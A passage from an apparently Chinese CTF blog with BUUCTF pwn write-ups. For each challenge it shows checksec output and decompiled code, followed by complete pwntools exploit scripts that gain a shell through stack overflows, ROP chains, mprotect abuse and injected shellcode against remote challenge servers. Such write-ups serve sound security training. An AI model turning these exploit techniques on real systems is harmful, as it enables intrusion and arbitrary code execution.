class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system_addr = lib.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = <span class="built_in">next</span>(lib.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span> + <span class="string">b&quot;\xff&quot;</span> * <span class="number">7</span></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">&quot;Correct\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">0xe7</span> + <span class="string">b&quot;b&quot;</span> * <span class="number">0x4</span></span><br><span class="line">payload += p32(system_addr) * <span class="number">2</span> + p32(binsh_addr)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  ciscn_2019_n_8 checksec ciscn_2019_n_8</span><br><span class="line">[*] &#x27;/mnt/c/Users/Lantern/Documents/Lantern/CTF/Games/BUUCTF/Pwn/ciscn_2019_n_8/ciscn_2019_n_8&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>保护全开</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  var[<span class="number">13</span>] = <span class="number">0</span>;</span><br><span class="line">  var[<span class="number">14</span>] = <span class="number">0</span>;</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, var);</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)&amp;var[<span class="number">13</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)&amp;var[<span class="number">13</span>] == <span class="number">0x11</span>LL )</span><br><span class="line">      system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;something wrong! val is %d&quot;</span>, var[<span class="number">0</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s, Welcome!\n&quot;</span>, var);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try do something~&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要<code> *(_QWORD *)&amp;var[13]</code>为0x11则可以getshell</p><h4 id="EXP-8"><a href="#EXP-8" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-v&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line">p = process(<span class="string">&quot;./ciscn_2019_n_8&quot;</span>)</span><br><span class="line">p = Remote(<span class="string">&quot;node4.buuoj.cn:27126&quot;</span>)</span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">rl = p.recvline</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;What&#x27;s your name?&quot;</span>)</span><br><span class="line">payload = p32(<span class="number">0x11</span>) * <span class="number">14</span></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h3><p>没有Canary和PIE</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  bjdctf_2020_babystack checksec bjdctf_2020_babystack</span><br><span class="line">[*] &#x27;/mnt/c/Users/Lantern/Documents/Lantern/CTF/Games/BUUCTF/Pwn/bjdctf_2020_babystack/bjdctf_2020_babystack&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>存在栈溢出和后门函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">12</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  LODWORD(nbytes) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;**********************************&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*     Welcome to the BJDCTF!     *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;* And Welcome to the bin world!  *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*  Let&#x27;s try to pwn the world!   *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;* Please told me u answer loudly!*&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]Are u ready?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]Please input the length of your name:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]What&#x27;s u name?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后门函数：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004006E6 backdoor        proc near</span><br><span class="line">.text:00000000004006E6 ; __unwind &#123;</span><br><span class="line">.text:00000000004006E6                 push    rbp</span><br><span class="line">.text:00000000004006E7                 mov     rbp, rsp</span><br><span class="line">.text:00000000004006EA                 mov     edi, offset command ; &quot;/bin/sh&quot;</span><br><span class="line">.text:00000000004006EF                 call    _system</span><br><span class="line">.text:00000000004006F4                 mov     eax, 1</span><br><span class="line">.text:00000000004006F9                 pop     rbp</span><br><span class="line">.text:00000000004006FA                 retn</span><br></pre></td></tr></table></figure><p>溢出到后门函数即可</p><h4 id="EXP-9"><a href="#EXP-9" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-v&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="comment"># p = process(&quot;./bjdctf_2020_babystack&quot;)</span></span><br><span class="line">p = Remote(<span class="string">&quot;node4.buuoj.cn:29795&quot;</span>)</span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">rl = p.recvline</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">sda = p.sendafter</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">backdoor_addr = <span class="number">0x00000000004006E6</span></span><br><span class="line">sla(<span class="string">&quot;[+]Please input the length of your name:&quot;</span>, <span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span> + <span class="string">b&quot;B&quot;</span> * <span class="number">8</span> + p64(backdoor_addr)</span><br><span class="line">sda(<span class="string">&quot;[+]What&#x27;s u name?&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h3><p>跟<strong>ciscn_2019_c_1</strong>一毛一样</p><h3 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h3><p>没有Canary， PIE 开启了NX保护</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">➜  not_the_same_3dsctf_2016 checksec not_the_same_3dsctf_2016</span><br><span class="line">[*] <span class="string">&#x27;/mnt/c/Users/Lantern/Documents/Lantern/CTF/Games/BUUCTF/Pwn/not_the_same_3dsctf_2016/not_the_same_3dsctf_2016&#x27;</span></span><br><span class="line">    Arch:     i386-<span class="number">32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br></pre></td></tr></table></figure><p>main函数存在栈溢出</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">45</span>]; <span class="comment">// [esp+Fh] [ebp-2Dh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;b0r4 v3r s3 7u 4h o b1ch4o m3m0... &quot;</span>);</span><br><span class="line">  gets(v4);                                     <span class="comment">// stack overflow</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在<code>get_secret</code>函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_secret</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// esi</span></span><br><span class="line"></span><br><span class="line">  v0 = fopen(<span class="string">&quot;flag.txt&quot;</span>, &amp;unk_80CF91B);</span><br><span class="line">  fgets(&amp;fl4g, <span class="number">45</span>, v0);</span><br><span class="line">  <span class="keyword">return</span> fclose(v0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="EXP1-1"><a href="#EXP1-1" class="headerlink" title="EXP1"></a>EXP1</h4><p>将flag存放到<code>.bss</code>段上, 因为存在<code>write</code>可以将flag输出出来</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-v&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line">p = process(<span class="string">&quot;./not_the_same_3dsctf_2016&quot;</span>)</span><br><span class="line">p = Remote(<span class="string">&quot;node4.buuoj.cn:25675&quot;</span>)</span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">rl = p.recvline</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">sda = p.sendafter</span><br><span class="line">ia = p.interactive</span><br><span class="line">elf = ELF(<span class="string">&quot;./not_the_same_3dsctf_2016&quot;</span>)</span><br><span class="line">fl4g = <span class="number">0x080ECA2D</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">0x2D</span> + p32(<span class="number">0x080489A0</span>) + p32(elf.sym[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">1</span>) + p32(fl4g) + p32(<span class="number">42</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h4 id="EXP2-1"><a href="#EXP2-1" class="headerlink" title="EXP2"></a>EXP2</h4><p>虽然开启了NX保护，但是存在<code>mprotect</code>, 则可以修改<code>bss</code>段为可读可写可执行，然后通过<code>read</code>函数往<code>bss</code>写shellcode，最后将执行流返回到<code>bss</code>即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-v&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line">p = process(<span class="string">&quot;./not_the_same_3dsctf_2016&quot;</span>)</span><br><span class="line">p = Remote(<span class="string">&quot;node4.buuoj.cn:25675&quot;</span>)</span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">rl = p.recvline</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">sda = p.sendafter</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./not_the_same_3dsctf_2016&quot;</span>)</span><br><span class="line">mprotect_addr = elf.sym[<span class="string">&quot;mprotect&quot;</span>]</span><br><span class="line">read_plt = elf.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">pop_3_ret = <span class="number">0x080483b8</span></span><br><span class="line">m_start = <span class="number">0x080EB000</span>  <span class="comment"># bss  ye</span></span><br><span class="line">bss = <span class="number">0x080EBF80</span>  <span class="comment"># bss</span></span><br><span class="line"><span class="built_in">len</span> = <span class="number">0x2000</span></span><br><span class="line">prot = <span class="number">4</span>+<span class="number">2</span>+<span class="number">1</span>  <span class="comment"># (rwx)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x2D</span>+p32(mprotect_addr)+p32(pop_3_ret) + \</span><br><span class="line">    p32(m_start)+p32(<span class="built_in">len</span>)+p32(prot)  <span class="comment"># mprotect(m_start,len,7);</span></span><br><span class="line">payload += p32(read_plt)+p32(bss+<span class="number">0x400</span>)+p32(<span class="number">0</span>) + \</span><br><span class="line">    p32(bss+<span class="number">0x400</span>)+p32(<span class="number">0x100</span>)  <span class="comment"># read(0,m_start,100)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = asm(shellcraft.sh(), arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)  <span class="comment"># shellcode len is 40</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h3><p>没有Canary和PIE, 开启NX</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  [HarekazeCTF2019]baby_rop checksec babyrop</span><br><span class="line">[*] &#x27;/mnt/c/Users/Lantern/Documents/Lantern/CTF/Games/BUUCTF/Pwn/[HarekazeCTF2019]baby_rop/babyrop&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>main函数存在栈溢出漏洞，程序中存在<code>system</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;echo -n \&quot;What&#x27;s your name? \&quot;&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v4);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome to the Pwn World, %s!\n&quot;</span>, v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并存在<code>/bin/sh</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211030174558263.png" alt="image-20211030174558263"></p><p>根据64位传参规则，需要找一个<code>pop rdi; ret;</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211030174840049.png" alt="image-20211030174840049"></p><h4 id="EXP-10"><a href="#EXP-10" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Debug</span>(<span class="params">p, breakpoints</span>):</span></span><br><span class="line">    gdb.attach(p, breakpoints)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./babyrop&quot;</span>)</span><br><span class="line">p = Remote(<span class="string">&quot;node4.buuoj.cn:26360&quot;</span>)</span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">rl = p.recvline</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">sda = p.sendafter</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./babyrop&quot;</span>)</span><br><span class="line">system_addr = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rdi_addr = <span class="number">0x0000000000400683</span></span><br><span class="line">bin_sh_addr = <span class="number">0x0000000000601048</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">0x10</span> + <span class="string">b&quot;B&quot;</span> * <span class="number">8</span> + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;What&#x27;s your name?&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h3><p>没有Canary、PIE，开启NX</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  jarvisoj_level2_x64 checksec level2_x64</span><br><span class="line">[*] &#x27;/mnt/c/Users/Lantern/Documents/Lantern/CTF/Games/BUUCTF/Pwn/jarvisoj_level2_x64/level2_x64&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>漏洞点在下面的函数中, 栈溢出</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;echo Input:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在<code>/bin/sh</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211030183852299.png" alt="image-20211030183852299"></p><p>根据64位传参规则，需要一个<code>rdi</code>的<code>gadget</code></p><p><img src="buuctf.assets/image-20211030184223526.png" alt="image-20211030184223526"></p><h4 id="EXP-11"><a href="#EXP-11" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Debug</span>(<span class="params">p, breakpoints</span>):</span></span><br><span class="line">    gdb.attach(p, breakpoints)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./level2_x64&quot;</span>)</span><br><span class="line">p = Remote(<span class="string">&quot;node4.buuoj.cn:27905&quot;</span>)</span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">rl = p.recvline</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./level2_x64&quot;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rdi_addr = <span class="number">0x00000000004006b3</span></span><br><span class="line">bin_sh_addr = <span class="number">0x0000000000600A90</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">128</span> + <span class="string">b&quot;B&quot;</span> * <span class="number">8</span> + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">sla(<span class="string">&quot;Input:&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  ciscn_2019_n_5  checksec ciscn_2019_n_5</span><br><span class="line">[*] &#x27;/mnt/c/Users/Lantern/Documents/Lantern/CTF/Games/BUUCTF/Pwn/ciscn_2019_n_5/ciscn_2019_n_5&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>main存在栈溢出</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> text[<span class="number">30</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;tell me your name&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, name, <span class="number">0x64</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;wow~ nice name!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want to say to me?&quot;</span>);</span><br><span class="line">  gets(text);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="EXP-12"><a href="#EXP-12" class="headerlink" title="EXP"></a>EXP</h4><p>name在<code>.bss</code>段上, 由于保护没开，故可以往上面写shellcode，跳过去执行即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Debug</span>(<span class="params">p, breakpoints</span>):</span></span><br><span class="line">    gdb.attach(p, breakpoints)</span><br><span class="line"></span><br><span class="line">p = process(<span 